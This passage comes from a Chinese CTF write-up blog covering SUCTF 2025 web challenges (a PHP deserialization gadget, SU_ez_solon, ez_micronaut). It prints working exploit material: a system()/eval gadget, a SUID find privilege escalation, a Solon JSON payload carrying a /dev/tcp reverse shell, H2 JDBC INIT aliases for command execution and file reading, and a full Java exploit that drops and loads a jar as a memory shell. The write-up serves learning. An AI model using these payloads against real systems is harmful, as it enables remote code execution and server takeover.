class="variable">$method</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_loaded[<span class="variable">$behavior</span>]-&gt;&#123;<span class="variable">$callMethod</span>&#125;(...<span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(</span><br><span class="line">            <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Cannot call `%s`, it does not belong to any attached behavior.&#x27;</span>, <span class="variable">$method</span>),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_loaded[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPUnit</span>\<span class="title class_">Framework</span>\<span class="title class_">MockObject</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">React</span>\<span class="title">Promise</span>\<span class="title">Internal</span>\<span class="title">RejectedPromise</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">call_user_func</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">class_exists</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">ConfigurableMethod</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="keyword">string</span> <span class="variable">$mockName</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="keyword">string</span> <span class="variable">$classCode</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;classCode = <span class="string">&quot;system(&#x27;find /flag.txt -exec cat /flag.txt \;&#x27;);&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mockName=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">class_exists</span>(<span class="variable">$this</span>-&gt;mockName, <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;classCode);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$this</span>-&gt;mockName,</span><br><span class="line">                <span class="string">&#x27;__phpunit_initConfigurableMethods&#x27;</span>,</span><br><span class="line">            ],</span><br><span class="line">            ...<span class="variable">$this</span>-&gt;configurableMethods,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mockName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rejectedPromise</span> = <span class="keyword">new</span> <span class="title class_">RejectedPromise</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$rejectedPromise</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现没权限，用suid提权</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507081415979.png" alt="image-20250708141514644"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /flag.txt -exec cat /flag.txt \;</span><br></pre></td></tr></table></figure>

<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507081423653.png" alt="image-20250708142325533"></p>
<h2 id="SU-ez-solon"><a href="#SU-ez-solon" class="headerlink" title="SU_ez_solon"></a>SU_ez_solon</h2><p>solon漏洞参考：<a target="_blank" rel="noopener" href="https://nlrvana.github.io/solonv2.5.11-rce/">Solonv2.5.11-RCE - N1Rvana’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12264">Magic In Java API 学习记录-先知社区</a></p>
<h3 id="做题过程-1"><a href="#做题过程-1" class="headerlink" title="做题过程"></a>做题过程</h3><p>是用hessian2来反序列化的，看了下依赖没有常见的hessian利用链，我见过的有洞的依赖也只有h2和fastjson,但是fastjson版本是1.2.83(我记得最高的是1.2.80?)，这个版本好像也没什么洞可以用了。因为这道题的名字是solon,用的也是solon框架，怀疑是solon有洞。</p>
<p>看了一下solon的洞，在接收参数时可以实例化@type参数后的类，并且可以调用对应setter给字段赋值。原本的rce处是sun.print.UnixPrintServiceLookup#execmd,这个方法会在UnixPrintServiceLookup的构造函数中被间接调用，但是要控制UnixPrintServiceLookup的一个属性lpcAllCom(因为win的jdk上没有这个类，只有类似的Win32PrintServiceLookup,并且很多方法还是native，我又懒得去在wsl中弄个idea了。就用下参考文章中的图)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230902130516-4e6d713c-494e-1.png" alt="img"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230902130521-512509da-494e-1.png" alt="img"></p>
<p>payload是这样</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    </span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.print.UnixPrintServiceLookup&quot;</span><span class="punctuation">,</span>   </span><br><span class="line">	<span class="attr">&quot;lpcFirstCom&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span>   </span><br><span class="line">		<span class="string">&quot;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">		<span class="string">&quot;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&quot;</span>  </span><br><span class="line">		<span class="punctuation">]</span>  </span><br><span class="line">	<span class="punctuation">&#125;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>但是这道题设置了个SecurityManager,不许你命令执行了<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507100956872.png" alt="image-20250710095621572"></p>
<p>确实没什么思路了。</p>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>fastjson在JSON-&gt;String的过程中会调用getter,在String-&gt;JSON的过程中会调用setter,因为题目直接在反序列化后调用了toString所以只需要反序列化一个实现了JSON的类，这里用的是JSONObject。</p>
<p>h2进行连接是通过JdbcConnection构造函数进行连接的。<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507101347511.png" alt="image-20250710134725215"></p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507101348632.png" alt="image-20250710134810392"></p>
<p>因为路由处理在最后调用了toString,可以用JSONObject#toString触发value的getter(复现了这么多fastjson的漏洞了我还是不记得这个东西，我到底复现了个啥。。。)</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507102134471.png" alt="image-20250710213452187"></p>
<p>通过codeql查询得到UnpooledDataSource存在getConnection调用了JdbcConnection构造函数(参数都是可控的)</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507102138649.png" alt="image-20250710213851461"></p>
<p>调用栈</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507102141506.png" alt="image-20250710214143412"></p>
<p>所以逻辑还是很简单的，只需要构造一个UnpooledDataSource放进JSONObject里就可以了。</p>
<p>遇到了一个莫名其妙的问题，反序列化的时候所有的类在加载的时候都显示classnotfoundexception,怀疑是编码出了问题</p>
<p>哎哟我真是唐得没边了。我打异常断点，结果在程序运行之前就显示classnotfoundexception,这是正常的，下次要勾选Caught(抛出)类型的异常。很多报错都只是警告，并不影响程序运行，这种就不用管他。明明要用反序列化后的对象调用toString,我压根没写这句话还对着孤单的hessian.readObejct()思考为什么报错。白白浪费一上午。。。</p>
<p>EXP</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507111115710.png" alt="image-20250711111527579"></p>
<p>2.sql，因为设置了个安全管理器，但只限制了命令执行，所以可以直接设置成null然后命令执行</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507111114440.png" alt="image-20250711111459353"></p>
<p>成功复现</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507111116891.png" alt="image-20250711111621664"></p>
<p>这是直接命令执行，试试文件读取</p>
<p>2.sql</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS DASHING <span class="keyword">AS</span> <span class="string">&#x27;void dashingRead() throws java.io.IOException &#123;java.io.File file = new java.io.File(&quot;D://flag.txt&quot;);java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(file));String line;while((line = br.readLine()) != null)&#123;System.out.println(line);&#125;&#125;’；</span></span><br><span class="line"><span class="string">CALL DASHING();</span></span><br></pre></td></tr></table></figure>

<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507111222428.png" alt="image-20250711122252255"></p>
<p>还可以用system.load()加载so文件，但在win的环境下好像有点麻烦，而且要写文件？感觉有点麻烦。好像还有种内存马的做法，下次碰见了专门的内存马题再说吧。</p>
<h2 id="ez-micronaut"><a href="#ez-micronaut" class="headerlink" title="ez_micronaut"></a>ez_micronaut</h2><h3 id="做题过程-2"><a href="#做题过程-2" class="headerlink" title="做题过程"></a>做题过程</h3><p>micronaut框架，但版本很高，我搜到的漏洞在这个版本都修复了。</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507111401408.png" alt="image-20250711140104192"></p>
<p>hello接收一个User参数，经过测试是传一个json,键名是对应的字段名，框架会自动把键值赋给User类，然后将这个User作为参数传上图中user()函数<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507111426115.png" alt="image-20250711142612902"></p>
<p>这key参数是Object,在toString()中会调用key.toString(),感觉这是一个突破口</p>
<p>objectMapper#writeValueAsString会调用User的getter方法，跟了writeValueAsString一遍，没发现什么调用toString的点。</p>
<p>现在要找到key键的反序列化规则。</p>
<p>调了很久，key的反序列化规则应该就是这个？</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507112321354.png" alt="image-20250711232148194"></p>
<p>调用栈就不放了，太长了。但这规则我横竖没看出来该怎么利用。</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>思路压根就是错的，既然题目提到了micronaut这个框架就应该从这个框架的一些特点着手。</p>
<p><code>@Serdeable</code>: 这个注解表明 <code>User</code> 类可以通过 Micronaut Serde 进行序列化和反序列化。</p>
<p>@JsonFilter(“key-filter”)这个注解告诉Micronaut Serde序列化反序列化User类时要用一个名为key-filter的类进行过滤</p>
<p><code>@Singleton</code>: 表明 <code>KeyFilter</code> 是一个单例 bean，在 Micronaut 应用程序中只会被创建一次</p>
<p>@Named(“key-filter”)为 <code>KeyFilter</code> 这个 bean 提供了一个名称 <code>&quot;key-filter&quot;</code>。这个名称与 <code>User</code> 类上的 <code>@JsonFilter(&quot;key-filter&quot;)</code> 相对应，这样 Micronaut 就能知道在序列化 <code>User</code> 对象时应该使用哪个过滤器，这就是我要找的key的反序列化逻辑(连题目给的类都没看完白花这么长时间调试只能说我活该)</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507151230037.png" alt="image-20250715123026764"></p>
<p>上图下方的checKey方法是将root作为数据源，expr作为jexl表达式,禁用了一些类</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507151246962.png" alt="image-20250715124612845"></p>
<p>jexl的沙箱不比SecurityManager，好像表达式中没有直接调用就不会触发黑名单。像ez_solon那道题就不能直接用h2命令执行，但这道题</p>
<p>可以。(我问了下ai，说因为h2大部分都是作为库嵌入我们的应用程序中，这种情况下h2和应用程序共用一个jvm,所以h2也在SecurityManager的管控之下，如果h2单独作为一个服务运行在其他端口，与应用程序不共用jvm，会不会就能绕过了呢？)</p>
<p>因为root是BeanUtil,其setU方法会实例化n字段的值所代表的类，参数为d字段，这就可以用h2实现rce</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507151320053.png" alt="image-20250715132028910"></p>
<p>表达式的payload:[n&#x3D;’cn.hutool.db.ds.pooled.PooledDataSource’,d&#x3D;new(‘cn.hutool.db.ds.pooled.PooledDataSource’,new(‘cn.hutool.db.ds.pooled.DbConfig’,’jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;CREATE ALIAS if not exists EXEC AS \‘void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\;}\‘\;CALL EXEC (\‘open -a Calculator\‘)\;’,’1111’,’111’)),u&#x3D;’cn.hutool.db.ds.pooled.PooledConnection’],注意转义的引号里面的分号要转义，比如这样<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507151324106.png" alt="image-20250715132421966"></p>
<p>成功弹出计算器，但因为题目不出网所以要用内存马。</p>
<p>之后要自己挖掘一个micronaut的内存马，这里要用到java-object-search</p>
<p>但是因为ctf中都是给的jar包，你调试给的jar包的话在evaluate中执行search代码的话是会给你说找不到依赖的，要自己在项目中引入micronaut依赖然后把search逻辑写进filter里面，直接写controller里面也行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;io.micronaut.http.netty.channel.NettyThreadFactory$NonBlockingFastThreadLocalThread&#125; </span><br><span class="line">  ---&gt; threadLocalMap = &#123;io.netty.util.internal.InternalThreadLocalMap&#125; </span><br><span class="line">   ---&gt; indexedVariables = &#123;class [Ljava.lang.Object;&#125; </span><br><span class="line">    ---&gt; [10] = &#123;io.micronaut.core.propagation.PropagatedContextImpl&#125; </span><br><span class="line">     ---&gt; elements = &#123;class [Lio.micronaut.core.propagation.PropagatedContextElement;&#125; </span><br><span class="line">      ---&gt; [0] = &#123;io.micronaut.http.context.ServerHttpRequestContext&#125; </span><br><span class="line">       ---&gt; httpRequest = &#123;io.micronaut.http.server.netty.NettyHttpRequest&#125;</span><br></pre></td></tr></table></figure>

<p>官方EXP（这预期解对我来说真有点太难了）（非预期有个盲注<a target="_blank" rel="noopener" href="https://eddiemurphy89.github.io/2025/01/15/SUCTF2025-WEB-Learning/#SU-ez-micronaut">SUCTF2025-WEB-Learning - EddieMurphy’s blog</a>）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hello.micronaut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.GsonBuilder;</span><br><span class="line"><span class="keyword">import</span> hello.micronaut.bean.User;</span><br><span class="line"><span class="keyword">import</span> hello.micronaut.utils.BeanUtil;</span><br><span class="line"><span class="keyword">import</span> io.micronaut.http.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> io.micronaut.http.HttpResponse;</span><br><span class="line"><span class="keyword">import</span> io.micronaut.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> io.micronaut.http.client.HttpClient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        String loadClassName = &quot;micronaut.poc.TestPoc&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">loadClassName</span> <span class="operator">=</span> <span class="string">&quot;micronaut.poc.EvilFilter&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loadClassPath</span> <span class="operator">=</span> <span class="string">&quot;/tmp/b.jar&quot;</span>;</span><br><span class="line"><span class="comment">//        String loadClassMethodName = &quot;poc&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">loadClassMethodName</span> <span class="operator">=</span> <span class="string">&quot;hacked&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loadClassPoc</span> <span class="operator">=</span> <span class="string">&quot;[n=&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,d=new(&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,new(&#x27;cn.hutool.db.ds.pooled.DbConfig&#x27;,&#x27;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS LOAD_JAR AS \\&#x27;void loadJar(String jarPath, String className, String methodName) throws Exception &#123;java.net.URL jarUrl = new java.net.URL(\\\&quot;file:\\\&quot; + jarPath)\\;java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;jarUrl&#125;)\\;Class&lt;?&gt; loadedClass = classLoader.loadClass(className)\\;Object instance = loadedClass.getDeclaredConstructor().newInstance()\\;java.lang.reflect.Method method = loadedClass.getMethod(methodName)\\;method.invoke(instance)\\;&#125;\\&#x27;\\;CALL LOAD_JAR(\\&#x27;&quot;</span> + loadClassPath + <span class="string">&quot;\\&#x27;, \\&#x27;&quot;</span> + loadClassName + <span class="string">&quot;\\&#x27;, \\&#x27;&quot;</span> + loadClassMethodName + <span class="string">&quot;\\&#x27;)\\;&#x27;,&#x27;1111&#x27;,&#x27;111&#x27;)),u=&#x27;cn.hutool.db.ds.pooled.PooledConnection&#x27;]&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jar2base64Path</span> <span class="operator">=</span> <span class="string">&quot;/Users/a1234/data/codes/java/micronaut-poc/target/original-micronaut-poc-0.1.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jar2base64</span> <span class="operator">=</span> jar2base64(jar2base64Path);</span><br><span class="line">        <span class="type">String</span> <span class="variable">writeJarPoc</span> <span class="operator">=</span> <span class="string">&quot;[n=&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,d=new(&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,new(&#x27;cn.hutool.db.ds.pooled.DbConfig&#x27;,&#x27;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS BASE64_TO_JAR AS \\&#x27;void base64ToJar(String base64Data, String filePath) throws java.io.IOException &#123;byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)\\;try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) &#123;fos.write(jarBytes)\\;&#125;&#125;\\&#x27;\\;CALL BASE64_TO_JAR (\\&#x27;&quot;</span> + jar2base64 + <span class="string">&quot;\\&#x27;,\\&#x27;&quot;</span> + loadClassPath + <span class="string">&quot;\\&#x27;)\\;&#x27;,&#x27;1111&#x27;,&#x27;111&#x27;)),u=&#x27;cn.hutool.db.ds.pooled.PooledConnection&#x27;]&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GsonBuilder</span>()</span><br><span class="line">                .create();</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanUtil</span> <span class="variable">beanUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanUtil</span>();</span><br><span class="line">        beanUtil.setUrl(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> gson.toJson(beanUtil, BeanUtil.class);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc1</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(json.getBytes()) + <span class="string">&quot;&lt;---&gt;&quot;</span> + writeJarPoc + <span class="string">&quot;&lt;---&gt;&quot;</span> + <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc2</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(json.getBytes()) + <span class="string">&quot;&lt;---&gt;&quot;</span> + loadClassPoc + <span class="string">&quot;&lt;---&gt;&quot;</span> + <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">poc1User</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;1&quot;</span>, Base64.getEncoder().encodeToString(poc1.getBytes()));</span><br><span class="line">        <span class="type">User</span> <span class="variable">poc2User</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;1&quot;</span>, Base64.getEncoder().encodeToString(poc2.getBytes()));</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        System.out.println(objectMapper.writeValueAsString(poc1User));</span><br><span class="line">        System.out.println(<span class="string">&quot;send1&quot;</span>);</span><br><span class="line">        sendPostRequest(<span class="string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="string">&quot;/hello/user&quot;</span>, objectMapper.writeValueAsString(poc1User));</span><br><span class="line">        System.out.println(<span class="string">&quot;send2&quot;</span>);</span><br><span class="line">        sendPostRequest(<span class="string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="string">&quot;/hello/user&quot;</span>, objectMapper.writeValueAsString(poc2User));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">jar2base64</span><span class="params">(String jarPath)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">jarFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(jarPath);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(jarFile)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] jarBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) jarFile.length()];</span><br><span class="line">            fis.read(jarBytes);</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(jarBytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sendGetRequest</span><span class="params">(String url, String endpoint)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">HttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClient.create(<span class="keyword">new</span> <span class="title class_">URL</span>(url))) &#123;</span><br><span class="line">            HttpRequest&lt;String&gt; request = HttpRequest.GET(endpoint);</span><br><span class="line">            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);</span><br><span class="line">            <span class="keyword">return</span> response.body();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sendPostRequest</span><span class="params">(String url, String endpoint, String data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">HttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClient.create(<span class="keyword">new</span> <span class="title class_">URL</span>(url))) &#123;</span><br><span class="line">            HttpRequest&lt;String&gt; request = HttpRequest.POST(endpoint, data)</span><br><span class="line">                    .contentType(MediaType.APPLICATION_JSON); <span class="comment">// 设置 Content-Type 头</span></span><br><span class="line">            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);</span><br><span class="line">            <span class="keyword">return</span> response.body();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>毁灭吧。</p>

  </div>

  
  <div class="about">
    <h1>About this Post</h1>
    <div class="details">
      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
    </div>
    
  </div>
  

  <div class="container post-prev-next">
    
    <a href="/2025/06/23/OverLong-Encoding/" class="next">
      <div class="text">
        <p class="label">Next</p>
        <h3 class="title">OverLong-Encoding</h3>
      </div>
    </a>
    
    <a class="prev"></a>
  </div>

  
    
    
  
</article>


    </main>
    <footer>
  <div class="inner">
    <div class="links">
      
      <div class="group">
        <h2 class="title">Blog</h2>
        
        <a href="/" class="item">Home</a>
        
        <a href="/archives" class="item">Archives</a>
        
        <a href="/tags" class="item">Tags</a>
        
        <a href="/categories" class="item">Categories</a>
        
        <a href="/search" class="item">Search</a>
        
        <a href="/links" class="item">link</a>
        
        <a href="/projects" class="item">Projects</a>
        
        <a href="/resume" class="item">Resume</a>
        
        <a href="/about" class="item">About</a>
        
        <a href="/atom.xml" class="item">RSS</a>
        
      </div>
      
      <div class="group">
        <h2 class="title">Projects</h2>
        
